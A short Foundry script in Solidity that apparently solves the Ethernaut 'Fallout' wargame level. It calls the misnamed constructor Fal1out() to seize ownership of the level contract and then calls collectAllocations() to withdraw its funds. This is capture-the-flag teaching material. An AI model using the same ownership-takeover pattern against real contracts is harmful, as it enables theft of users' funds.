// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutSolve is Script{
    Fallout public level2 = Fallout(0xf66ffe7e1e2663E19fec83F39256cc3Af3513000);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Original Owner : ", level2.owner());
        level2.Fal1out();
        console.log("New Owner : ", level2.owner());
        level2.collectAllocations();

        vm.stopBroadcast();
    }
}

